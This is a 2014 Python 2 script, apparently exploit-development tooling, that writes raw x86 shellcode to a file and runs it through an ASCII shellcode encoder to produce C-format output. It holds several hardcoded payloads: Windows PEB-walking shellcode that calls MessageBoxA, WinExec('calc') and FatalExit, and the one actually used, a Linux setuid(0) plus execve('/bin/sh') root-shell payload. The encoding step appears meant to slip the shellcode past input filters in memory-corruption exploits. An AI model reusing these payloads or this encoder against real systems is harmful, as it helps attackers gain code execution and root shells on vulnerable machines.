###############################################################
#               Shellcode Encoder
#
#       Copyright (C) 2014 random <random@pku.edu.cn>
#
###############################################################

import os

try:
	import sys 
	sys.path.append("..") 
	from lib.ledt import *
	from lib.shellcode_encoder.shellcode_encoder import *
except Exception,e:
	print e



def GenShellcode(binfile):
	code =\
	"\x55\x8B\xEC\x33\xC9\x51\x51\x6A\x20\x68\x49\x53\x43\x43\x6A\x20"+\
	"\x6A\x20\x68\x49\x53\x43\x43\x68\x33\x32\x00\x00\x68\x75\x73\x65"+\
	"\x72\x68\x6F\x78\x41\x00\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73"+\
	"\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x1C\x8B\x46\x08\x8B\x7E\x20"+\
	"\x8B\x36\x66\x39\x4F\x18\x75\xF2\x8B\xF0\x8B\x46\x3C\x8B\x4C\x30"+\
	"\x78\x03\xCE\x8B\x59\x20\x03\xDE\x33\xFF\x4F\x60\x47\x8B\x14\xBB"+\
	"\x03\xD6\x8B\x02\x3D\x4C\x6F\x61\x64\x75\xF1\x8B\x42\x04\x3D\x4C"+\
	"\x69\x62\x72\x75\xE7\x8B\x42\x08\x3D\x61\x72\x79\x41\x75\xDD\x8B"+\
	"\x59\x24\x03\xDE\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDE\x03\x34\xBB"+\
	"\x8B\xC6\x89\x45\xFC\x61\x47\x8B\x14\xBB\x03\xD6\x8B\x02\x3D\x47"+\
	"\x65\x74\x50\x75\xF1\x8B\x42\x04\x3D\x72\x6F\x63\x41\x75\xE7\x8B"+\
	"\x42\x08\x3D\x64\x64\x72\x65\x75\xDD\x8B\x42\x0C\x66\x3D\x73\x73"+\
	"\x75\xD4\x8B\x59\x24\x03\xDE\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDE"+\
	"\x03\x34\xBB\x8B\xC6\x89\x45\xF8\x8D\x5D\xDC\x53\xFF\x55\xFC\x8D"+\
	"\x5D\xD0\x53\x50\xFF\x55\xF8\x6A\x00\x8D\x5D\xF0\x53\x8D\x5D\xE4"+\
	"\x53\x6A\x00\xFF\xD0\x31\xc0\x50\xff\x55\x08"

	code =\
	"\x60\x33\xc0\x50\x68\x63\x61\x6c\x63\x50\x68\x78\x65\x63\x3f\x88"+\
	"\x44\x24\x03\x68\x57\x69\x6e\x45\x50\x68\x65\x6c\x33\x32\x68\x6b"+\
	"\x65\x72\x6e\x64\x8b\x50\x30\x8b\x52\x0c\x83\xc2\x1c\x8b\xc2\x33"+\
	"\xc9\x8b\x14\x0a\x3b\xc2\x74\x6d\x8b\x72\x20\x8b\xfc\xb1\x08\x8a"+\
	"\x44\x4e\xfe\x8a\x5c\x0f\xff\xfe\xc9\x3a\xc3\x74\xf2\x80\xf9\xff"+\
	"\x75\xdd\x8b\x42\x08\x8b\x52\x08\x03\x40\x3c\x8b\x40\x78\x03\xc2"+\
	"\x8b\x58\x20\x13\xda\x8b\x48\x18\x8b\x3b\x03\xfa\x8d\x74\x24\x0c"+\
	"\x51\xb1\x08\xf3\xa6\x84\xc9\x59\x74\x07\x83\xc3\x04\xe2\xe9\xeb"+\
	"\x24\x2b\xda\x2b\x58\x20\xd1\xeb\x03\x58\x24\x03\xda\x0f\xb7\x0b"+\
	"\xc1\xe1\x02\x03\x48\x1c\x03\xca\x8b\x09\x03\xca\x8d\x5c\x24\x18"+\
	"\x6a\x01\x53\xff\xd1\x83\xc4\x20\x61\xc3"

	code =\
	"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"+\
    "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"+\
	"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"+\
	"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"+\
	"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"+\
	"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"+\
	"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"+\
	"\x49\x0b\x31\xc0\x51\x50\xff\xd7"


	code = \
	"\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xdb\xb0\x17\xcd\x80"+\
	"\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"+\
	"\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
	fd = open(binfile,'wb')
	fd.write(code)
	fd.close()


if __name__ == '__main__':

	GenShellcode('shellcode.bin')
	
	shellcode = ShellcodeEncoder.ReadRawShellcodeFromFile('shellcode.bin')
	asmcode = ShellcodeEncoder.AsiccEncode(shellcode).replace('\n',';')
	
	#print asmcode
	ledt  = LEDT()
	opcode = ledt.assemble(asmcode)
	#print ShellcodeEncoder.out_format('bin',opcode)
	print ShellcodeEncoder.out_format('c',opcode)
	
	